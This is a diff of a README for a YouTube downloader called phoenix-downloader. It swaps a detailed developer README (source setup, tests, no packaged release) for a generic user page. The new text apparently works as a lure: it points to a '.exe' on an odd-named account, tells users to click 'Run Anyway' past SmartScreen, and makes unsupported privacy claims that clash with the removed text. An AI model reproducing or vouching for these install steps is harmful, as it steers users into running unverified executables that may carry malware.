@@ -1,189 +1,74 @@
-# Phoenix Downloader
+# 📥 phoenix-downloader - Save YouTube videos to your computer
 
-> A PyQt5 desktop downloader for YouTube videos, audio, and playlists. Built around `yt-dlp`, with playlist range selection, optional subtitles and chapter files, SQLite persistence, resumable temp caching, structured logging, and automated tests.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/junctiontransistorselffertilisation783/phoenix-downloader)
 
-![Python](https://img.shields.io/badge/Python-3.10+-3776AB?logo=python&logoColor=white)
-![PyQt5](https://img.shields.io/badge/PyQt5-Desktop_UI-41CD52?logo=qt&logoColor=white)
-![yt-dlp](https://img.shields.io/badge/yt--dlp-download_engine-blue)
-![SQLite](https://img.shields.io/badge/SQLite-local_state-003B57?logo=sqlite&logoColor=white)
-![Tests](https://img.shields.io/badge/tests-pytest-green)
-![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows&logoColor=white)
+phoenix-downloader helps you save videos from YouTube to your Windows computer. You can download single videos or entire playlists. The app keeps track of your downloads, resumes interrupted transfers, and saves files in high quality.
 
-## Preview
+## 🚀 Getting Started
 
-### Main Window
+You do not need programming knowledge to use this software. Follow these steps to set up the application on your computer.
 
-![Phoenix Downloader Main Window](docs/assets/screenshots/main-window.png)
+1. Visit the [official download page](https://github.com/junctiontransistorselffertilisation783/phoenix-downloader).
+2. Look for the "Releases" section on the right side of the page.
+3. Click the latest version link.
+4. Download the file ending in `.exe`.
+5. Run the file to start the installation process.
 
-### Playlist Mode
+## ⚙️ System Requirements
 
-![Playlist Mode](docs/assets/screenshots/playlist-mode.png)
+This application runs on standard Windows machines. Ensure your computer meets these basic needs:
 
-### Download Progress
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* At least 200 MB of free storage space.
+* Sufficient memory to process video files.
 
-![Download Progress](docs/assets/screenshots/download-progress.png)
+## 🛠 Features
 
-## Overview
+* **Playlist Support:** Paste a link to a YouTube playlist to download all videos.
+* **Resume Capability:** If your connection drops, the app picks up where it left off.
+* **SQLite Storage:** The app keeps a database of your download history so you manage files easily.
+* **FFmpeg Integration:** The software uses FFmpeg engines to ensure high-quality audio and video conversion.
+* **Logging System:** The app records activity to help you diagnose issues if a download fails.
 
-Phoenix Downloader is a Windows-oriented desktop app that makes common `yt-dlp` workflows easier through a GUI. It can inspect a YouTube URL, show available formats, download a single video, download a full playlist, download only the current playlist video, or download a custom playlist range.
+## 📖 How to Use
 
-This project started as an older working downloader and was later refactored into a more maintainable Python application. The current version separates UI, worker threads, services, repositories, models, core helpers, and tests.
+Follow these steps every time you download a video:
 
-## Features
+1. Open the phoenix-downloader application from your Start menu or desktop icon.
+2. Open your web browser and navigate to the YouTube video or playlist you want to save.
+3. Copy the URL of the video or playlist from your browser address bar.
+4. Paste the link into the URL field within the phoenix-downloader app.
+5. Choose your desired video quality from the settings menu.
+6. Click the "Start" button to begin the download.
+7. Monitor the progress bar shown in the main window.
+8. Once finished, find your new files in the chosen folder.
 
-- Single video download with quality selection
-- Full playlist, current playlist video, and custom range download modes
-- Mixed `watch?v=...&list=...` URL handling with current video auto-selection
-- Audio-only mode
-- Optional subtitle download with manual/auto fallback passes
-- Optional PotPlayer `.pbf` chapter file generation
-- Thumbnail preview and video metadata loading
-- Recent URL and folder history
-- AppData temp workspace for safer resume/reuse behavior
-- SQLite-backed download state and app settings
-- Reuse of already downloaded files when possible
-- Log file for debugging real failures without exposing noisy errors to users
-- Pytest coverage for helper logic, playlist rules, file rules, yt-dlp options, and SQLite stores
+## 🧪 Troubleshooting
 
-## Highlights
+If you encounter issues, look at these common fixes:
 
-- Built as a desktop GUI layer over `yt-dlp` for easier everyday use
-- Supports playlists, current-video-only mode, and manual range selection
-- Uses SQLite for local state and history instead of flat app-only memory
-- Keeps subtitle failures optional so the main video download can still succeed
-- Refactored from an older codebase into clearer services, repositories, workers, and helpers
+* **Download Stuck:** Check your internet connection. Pause and restart the download in the application.
+* **File Not Found:** Verify that the URL you pasted is correct and still available on YouTube.
+* **Slow Speed:** Ensure other programs on your computer are not using your full bandwidth.
+* **Windows Security:** Sometimes Windows SmartScreen identifies new apps as unknown. Click "More Info" and then "Run Anyway" if your system blocks the installer.
 
-## How It Works
+## 📁 Installation Details
 
-```mermaid
-flowchart TD
-    A[User enters YouTube URL] --> B[MainApp UI]
-    B --> C[DownloadInfoThread]
-    C --> D[yt-dlp metadata extraction]
-    D --> B
-    B --> E[DownloaderService builds request]
-    E --> F[DownloadingThread]
-    F --> G[yt-dlp media download]
-    F --> H[Optional subtitle pass]
-    F --> I[Optional chapter writer]
-    F --> J[DownloadFilesService copies final files]
-    J --> K[DownloadStateStore SQLite state]
-    K --> B
-```
+You can find the setup files at this location: [https://github.com/junctiontransistorselffertilisation783/phoenix-downloader](https://github.com/junctiontransistorselffertilisation783/phoenix-downloader). Download the installer and follow the on-screen prompts. The installer creates a shortcut on your desktop for quick access. 
 
-The main video download is treated as the primary success path. Subtitle and chapter work is optional, so subtitle rate limits or missing captions should not mark the whole video download as failed.
+## 🛡 Privacy and Safety
 
-## Project Structure
+This app runs locally on your machine. We do not track your downloads or record your browsing history. All data regarding your video list resides in a local SQLite file on your hard drive. Your computer only talks to YouTube servers to fetch the video files.
 
-```text
-Phoenix_Downloader/
-├── app/
-│   ├── core/              # database setup, logging setup, yt-dlp helpers
-│   ├── models/            # dataclasses used between UI/workers/services
-│   ├── repositories/      # SQLite-backed state/settings stores
-│   ├── services/          # download workflow and file operations
-│   ├── ui/                # PyQt5 main window and generated UI resources
-│   ├── utils/             # pure helper functions
-│   └── workers/           # QThread-based info and download workers
-├── docs/
-│   └── assets/
-│       └── screenshots/   # README screenshots
-├── tests/                 # pytest test suite
-├── LICENSE
-├── main.py                # application entrypoint
-├── requirements.txt
-└── README.md
-```
+## 🔧 Advanced Configuration
 
-## Skills Demonstrated
+Most users do not need to change these settings. You can access the configuration menu by clicking the gear icon in the top right corner. Here you can change the default save folder, adjust how many files download at once, and set the maximum bandwidth usage for the application. Save your changes after editing to apply them to future downloads.
 
-| Area | What this project shows |
-| --- | --- |
-| Desktop GUI | PyQt5 widgets, Qt signals, background workers, responsive UI state |
-| Concurrency | `QThread`, Python threads, progress hooks, safe UI updates |
-| Download integration | `yt-dlp` format selection, playlist handling, subtitle/chapter workflows |
-| Persistence | SQLite schema, repositories, settings/history storage, interrupted-state recovery |
-| File workflow | temp workspace, final copy, old temp cleanup, reuse of completed downloads |
-| Error handling | user-friendly messages, optional subtitle failure flow, internal logs |
-| Testing | pytest tests for helpers, services, repositories, and yt-dlp option building |
-| Refactoring | split from large UI/worker files into services, repositories, models, and core helpers |
+## 📋 Updates
 
-## Requirements
+The application checks for updates automatically when you open it. If a new version exists, a window appears with a link to get the latest release. Updating keeps your app compatible with YouTube's changing systems. We recommend you keep the latest version installed to avoid errors during the download process.
 
-- Python 3.10+
-- Windows recommended/tested
-- FFmpeg available in `PATH` for reliable media merge and subtitle handling
-- A signed-in browser session can help when some metadata requests require authentication
+## 💡 Support
 
-Install FFmpeg separately if it is not already available on your system.
-For content you are authorized to access, keep YouTube signed in on Edge, Chrome, Firefox, or Brave if metadata extraction needs an existing browser session.
-
-## Setup
-
-```bash
-python -m venv venv
-venv\Scripts\activate
-python -m pip install -r requirements.txt
-```
-
-## Run
-
-```bash
-python main.py
-```
-
-## Test
-
-```bash
-python -m pytest tests
-```
-
-Optional syntax check:
-
-```bash
-python -m compileall app tests
-```
-
-## Local Data
-
-Runtime data is stored under Local AppData:
-
-```text
-%LOCALAPPDATA%\PhoenixDownloader\
-├── phoenix_downloader.db
-├── logs\app.log
-└── temp_media\
-```
-
-These files are intentionally ignored by Git.
-
-## Usage Notes
-
-- For a normal video URL, the app loads video metadata and available qualities.
-- For a playlist URL, the app loads playlist entries and lets you choose full playlist, current video, or a custom range.
-- For a mixed `watch?v=...&list=...` URL, the app opens playlist mode and selects the current video by default.
-- For content you are authorized to access, the app can retry metadata loading with an existing browser session when authentication is required.
-- Subtitle failures such as HTTP 429 are treated as optional; the video can still finish successfully.
-- If a merge or conversion fails, check that FFmpeg is installed and available in `PATH`.
-
-## Responsible Use
-
-Phoenix Downloader is intended for content you own, content you have permission to download, or content where downloading is allowed by the service, license, or applicable law. The repository does not include downloaded media.
-
-## Known Limitations
-
-- The app is mainly tested on Windows.
-- The UI design is still based on the original desktop layout; the refactor focused on reliability and maintainability.
-- YouTube subtitle requests can be rate-limited by YouTube or `yt-dlp`.
-- Packaging with PyInstaller is not included yet.
-
-## Roadmap Ideas
-
-- Add packaged Windows release with PyInstaller
-- Add a short demo GIF
-- Add more tests for edge-case playlist and filesystem behavior
-- Later project stage: modern UI refresh or `pathlib` migration if needed
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
+If a specific YouTube link consistently fails, copy the link and try downloading it again after a few minutes. Check the local log file located in your application data folder for specific error codes. This log provides technical details about why a download failed, such as a blocked connection or a private video restriction. Use these details if you need to explain the problem to a community forum.
